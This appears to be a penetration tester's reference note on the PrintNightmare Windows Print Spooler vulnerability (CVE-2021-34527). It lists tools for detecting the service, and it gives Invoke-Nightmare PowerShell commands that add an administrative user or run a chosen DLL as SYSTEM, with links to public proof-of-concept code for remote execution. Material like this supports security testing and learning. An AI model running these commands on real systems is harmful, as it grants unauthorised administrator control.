# CVE-2021-34527 / Print Nightmare

> A vulnerability that allows remote code execution as `SYSTEM` on any unpatched computer running the **Windows Print Spooler service**. Similar but distinct from the [[CVE-2021-1675|CVE-2021-1675 vulnerability]].

---

## Determine if a Machine is Running the Windows Print Spooler Service

From Linux:
	- [[rpcdump#Determine if a Computer has the Print Spooler Service Enabled credentials may be required|impacket-rpcdump]] (`python`)

From Windows:
	- [SpoolSample](https://github.com/leechristensen/SpoolSample) (`C#`)

---

## Local Privilege Escalation with Invoke-Nightmare PowerShell POC

With local PowerShell access to a target machine running the Windows Print Spooler service, [[powershell#Import a PowerShell Module|import]] `CVE-2021-34527.ps1` from [this Github repository](https://github.com/JohnHammond/CVE-2021-34527) and run the following to create a new administrative user:

```powershell
Invoke-Nightmare -NewUser $NEW_USERNAME -NewPassword $NEW_PASSWORD [-DriverName $DRIVER_NAME]
```

To run your own DLL as `SYSTEM`:

```powershell
Invoke-Nightmare -DLL $PATH_TO_DLL
```

---

## Remote Command Execution with `cube0x0`'s Python POC & impacket

Read the `Cube0x0 Impacket RCE` section on [this blog post](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).

---

## Local Privilege Escalation & Remote Command Execution with `cube0x0`'s C# POC

Read the `Cube0x0 SharpPrintNightmare LPE/RCE` section on [this blog post](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html).

---

## References

[Microsoft MSRC Report](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)

[Demystifying the Print Nightmare Vulnerability](https://www.sygnia.co/demystifying-the-printnightmare-vulnerability)

[Playing with Print Nightmare](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)

[PowerShell LPE POC](https://github.com/JohnHammond/CVE-2021-34527)

[Python RCE POC](https://github.com/cube0x0/CVE-2021-1675)

[C# LPE/RCE POC](https://github.com/cube0x0/CVE-2021-36934)
